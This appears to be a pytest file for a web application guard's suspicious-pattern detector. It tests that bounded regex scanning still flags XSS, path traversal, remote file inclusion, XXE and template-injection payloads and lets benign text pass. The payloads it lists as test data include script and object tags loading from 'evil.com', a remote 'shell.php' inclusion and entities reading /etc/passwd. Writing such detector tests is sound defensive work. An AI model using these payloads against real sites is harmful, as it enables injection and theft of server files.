import re

import pytest

from guard_core.sync.detection_engine.scan_window import bounded_finditer
from guard_core.sync.handlers.suspatterns_handler import (
    _PATTERN_SCAN_WINDOW_MATCHERS,
    _SCAN_WINDOW_PATTERNS,
    _SSTI_HASH_BRACE_SHAPE_RE,
    SusPatternsManager,
)


def _build_isolated_manager() -> SusPatternsManager:
    original_instance = SusPatternsManager._instance
    original_config = SusPatternsManager._config
    SusPatternsManager._instance = None
    SusPatternsManager._config = None
    manager = SusPatternsManager()
    SusPatternsManager._instance = original_instance
    SusPatternsManager._config = original_config
    return manager


_MANAGER = _build_isolated_manager()


def _detected_categories(content: str, context: str = "request_body") -> set[str]:
    result = _MANAGER.detect(content, "203.0.113.9", context)
    if not result["is_threat"]:
        return set()
    return {str(threat.get("category")) for threat in result["threats"]}


@pytest.mark.parametrize(
    ("case_id", "category", "payload"),
    [
        (
            "emb_xss_script_lt_attr",
            "xss",
            '<script x="<" src="//evil/x.js">alert(1)</script>',
        ),
        (
            "emb_xss_object_lt_attr",
            "xss",
            '<object x="<" data="//evil.com/x.swf"></object>',
        ),
        (
            "emb_xss_embed_lt_attr",
            "xss",
            '<embed x="<" src="//evil.com/x.swf"></embed>',
        ),
        (
            "emb_xss_applet_lt_attr",
            "xss",
            '<applet x="<" code="//evil.com/x.class"></applet>',
        ),
        (
            "emb_xss_style_expression_nested_paren",
            "xss",
            '<div style="x:expression(String.fromCharCode(97))">',
        ),
        (
            "emb_dir_traversal_matrix_param_dot",
            "dir_traversal",
            "/app/..;jsessionid=ABCDEF0123456789.node1/WEB-INF/web.xml",
        ),
        (
            "emb_file_inclusion_multisegment_path",
            "file_inclusion",
            "=http://evil.com/a/b/shell.php",
        ),
        (
            "emb_xml_entity_system_literal_lt",
            "xml",
            '<!ENTITY xxe SYSTEM "http://evil.com/<x">',
        ),
        (
            "emb_xml_doctype_externalid_lt",
            "xml",
            '<!DOCTYPE foo SYSTEM "http://evil.com/<x" '
            '[<!ENTITY xxe SYSTEM "http://evil.com/y">]>',
        ),
        (
            "emb_template_ssti_hash_brace_string_hash",
            "template",
            '#{"a#b".gsub(/x/,"y")}',
        ),
        (
            "xml_cdata_basic",
            "xml",
            "<![CDATA[<script>alert(1)</script>]]>",
        ),
    ],
)
def test_embedded_terminator_payload_still_detected(
    case_id: str, category: str, payload: str
) -> None:
    assert category in _detected_categories(payload), case_id


@pytest.mark.parametrize(
    ("case_id", "payload"),
    [
        ("plain_prose_no_markup", "the quarterly report is attached for review"),
        ("benign_static_asset_reference", "loading /static/app.js in the browser"),
        ("benign_ordinary_json_field", '{"filename": "vacation.jpg", "size": 204800}'),
        ("benign_ordinary_path", "/reports/2026/q1/summary.pdf"),
    ],
)
def test_benign_content_not_flagged(case_id: str, payload: str) -> None:
    result = _MANAGER.detect(payload, "203.0.113.9", "request_body")
    assert not result["is_threat"], case_id


def test_scan_registries_cover_ten_generic_patterns_and_the_hash_template() -> None:
    assert len(_SCAN_WINDOW_PATTERNS) == 10
    assert _SSTI_HASH_BRACE_SHAPE_RE in _PATTERN_SCAN_WINDOW_MATCHERS
    assert _SSTI_HASH_BRACE_SHAPE_RE not in _SCAN_WINDOW_PATTERNS
    known_sources = {pat for pat, _c, _cat in SusPatternsManager._pattern_definitions}
    for source in _SCAN_WINDOW_PATTERNS:
        assert source in known_sources


def test_scan_window_registry_pairs_are_compiled_patterns() -> None:
    for bounds in _SCAN_WINDOW_PATTERNS.values():
        assert isinstance(bounds, tuple)
        assert len(bounds) >= 1
        for prefix, terminator in bounds:
            assert isinstance(prefix, re.Pattern)
            assert isinstance(terminator, re.Pattern)


@pytest.mark.parametrize(
    ("source", "attack_text", "benign_text"),
    [
        (
            r"<script[^>]*>[^<]*<\/script\s*>",
            '<script src="//evil.com/x.js"></script>',
            "<div>no script tag here</div>",
        ),
        (
            r"(?:<object[^>]*>[\s\S]*<\/object\s*>)",
            '<object data="//evil.com/x.swf"></object>',
            "<p>an ordinary paragraph</p>",
        ),
        (
            r"(?:<embed[^>]*>[\s\S]*<\/embed\s*>)",
            '<embed src="//evil.com/x.swf"></embed>',
            "<span>plain text</span>",
        ),
        (
            r"(?:<applet[^>]*>[\s\S]*<\/applet\s*>)",
            '<applet code="//evil.com/x.class"></applet>',
            "<a href='/home'>home</a>",
        ),
        (
            (
                r"(?:<[A-Za-z/][^<>]*style\s*=\s{0,20}[\"']?[^<>\"']*"
                r"(?:expression|behavior|url)\s*\([^)]*\))"
            ),
            '<div style="x:expression(alert(1))">',
            '<div style="color:red">',
        ),
        (
            r"\.\.;[^/\\]*[/\\]",
            "/app/..;/etc/passwd",
            "/app/normal/path/file.txt",
        ),
        (
            (
                r"=(?:https?|ftp):\/\/[^\s'\"<>]+\/[^\s'\"<>\/]*"
                r"\.(?:phtml|php[3-5]?|phar|jsp|aspx?|pl|py|txt|inc)"
                r"(?![a-zA-Z0-9])"
            ),
            "=http://evil.com/shell.php",
            "=http://example.com/report.pdf",
        ),
        (
            r"<!(?:ENTITY|DOCTYPE)[^>]+SYSTEM[^>]+>",
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
            "<!DOCTYPE html>",
        ),
        (
            r"(?:<!\[CDATA\[.*?\]\]>)",
            "<![CDATA[<script>evil()</script>]]>",
            "<p>no cdata section here</p>",
        ),
        (
            r"<!DOCTYPE[^>\[]*\[[\s\S]*?<!ENTITY",
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">',
            "<!DOCTYPE html>",
        ),
        (
            _SSTI_HASH_BRACE_SHAPE_RE,
            '#{system("id")}',
            "the price is #100 today",
        ),
    ],
)
def test_bounded_scan_matches_raw_scan_verdict(
    source: str, attack_text: str, benign_text: str
) -> None:
    compiled = re.compile(source, re.IGNORECASE)
    for text in (attack_text, benign_text):
        raw_verdict = compiled.search(text) is not None
        if source in _PATTERN_SCAN_WINDOW_MATCHERS:
            bounded_verdict = bool(
                _PATTERN_SCAN_WINDOW_MATCHERS[source](text, compiled)
            )
        else:
            bounded_verdict = any(
                next(bounded_finditer(text, compiled, prefix, terminator), None)
                is not None
                for prefix, terminator in _SCAN_WINDOW_PATTERNS[source]
            )
        assert bounded_verdict == raw_verdict, (source[:60], text)


def test_file_inclusion_trailing_lookahead_rejects_extra_alnum_suffix() -> None:
    source = (
        r"=(?:https?|ftp):\/\/[^\s'\"<>]+\/[^\s'\"<>\/]*"
        r"\.(?:phtml|php[3-5]?|phar|jsp|aspx?|pl|py|txt|inc)"
        r"(?![a-zA-Z0-9])"
    )
    compiled = re.compile(source, re.IGNORECASE)
    bounds = _SCAN_WINDOW_PATTERNS[source]
    text = "=http://evil.com/a/shell.phpx"

    raw_verdict = compiled.search(text) is not None
    bounded_verdict = any(
        next(bounded_finditer(text, compiled, prefix, terminator), None) is not None
        for prefix, terminator in bounds
    )

    assert raw_verdict is False
    assert bounded_verdict == raw_verdict
